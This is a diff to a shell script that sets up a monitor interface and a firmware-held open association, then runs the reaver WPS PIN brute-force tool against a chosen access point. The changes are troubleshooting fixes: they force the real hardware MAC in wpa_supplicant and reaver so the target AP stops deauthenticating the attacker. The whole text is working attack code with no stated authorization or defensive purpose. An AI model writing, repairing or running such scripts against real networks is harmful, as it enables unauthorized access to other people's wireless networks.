@@ -93,22 +93,36 @@ info "WPS    : $MONIF (monitor, reaver -A drives EAP-WSC)"
 # 1. Clean slate.
 teardown >/dev/null 2>&1
 
-# 2. Bring the STA iface up.
+# 2. Bring the STA iface up and read its REAL MAC. Both vifs and reaver must
+#    use this one MAC: it is the address the firmware put in its hardware
+#    Address Match Table, so it is the only MAC the chip ACKs for. (The first
+#    attempt failed with deauth reason 6 -- "class-2 frame from nonauthenticated
+#    STA" -- because wpa_supplicant had randomized its MAC, so the AP saw one
+#    MAC authenticate and a different MAC send association/WPS frames.)
 ip link set "$IFACE" up 2>/dev/null
 sleep 1
+HWMAC="$(cat "/sys/class/net/$IFACE/address" 2>/dev/null)"
+[ -n "$HWMAC" ] || HWMAC="$(ip link show "$IFACE" 2>/dev/null | awk '/link\/ether/{print $2}')"
+[ -n "$HWMAC" ] && ok "Using on-board MAC $HWMAC for both the link and reaver (AMT/ACK match)." \
+                 || warn "could not read $IFACE MAC; MAC mismatch may cause reason-6 deauth."
 
 # 3. wpa_supplicant: OPEN association to the AP so the firmware holds the link
 #    and ACKs in hardware. (WPS APs accept an open association for the WSC
 #    exchange.) Private control socket so we don't fight Android's supplicant.
+#    mac_addr=0 / preassoc_mac_addr=0 force the REAL hardware MAC (no
+#    randomization) so the AP sees a single, ACKed, authenticated STA.
 mkdir -p "$(dirname "$CONF")" "$CTRL" 2>/dev/null
 cat > "$CONF" <<EOF
 ctrl_interface=$CTRL
 update_config=1
 ap_scan=1
+mac_addr=0
+preassoc_mac_addr=0
 network={
 	bssid=$BSSID
 	key_mgmt=NONE
 	scan_ssid=1
+	mac_addr=0
 	disabled=0
 }
 EOF
@@ -145,12 +159,16 @@ iw dev "$MONIF" set channel "$CHAN" 2>/dev/null
 ip link show "$MONIF" >/dev/null 2>&1 || die "could not create $MONIF"
 ok "$MONIF up on channel $CHAN."
 
-# 5. Run reaver in external-association mode against the held link.
+# 5. Run reaver in external-association mode against the held link, forcing
+#    reaver to source from the SAME real MAC (-m) the firmware ACKs. Without
+#    this reaver uses its own/spoofed MAC and the AP deauths with reason 6.
+MACARG=""
+[ -n "$HWMAC" ] && MACARG="-m $HWMAC"
 echo
-info "Launching reaver -A on $MONIF (association held by firmware)..."
-echo "    reaver -i $MONIF -b $BSSID -c $CHAN -A ${EXTRA:--vv}"
+info "Launching reaver -A on $MONIF (association held by firmware, MAC $HWMAC)..."
+echo "    reaver -i $MONIF -b $BSSID -c $CHAN -A $MACARG ${EXTRA:--vv}"
 echo
-reaver -i "$MONIF" -b "$BSSID" -c "$CHAN" -A ${EXTRA:--vv}
+reaver -i "$MONIF" -b "$BSSID" -c "$CHAN" -A $MACARG ${EXTRA:--vv}
 rc=$?
 
 echo
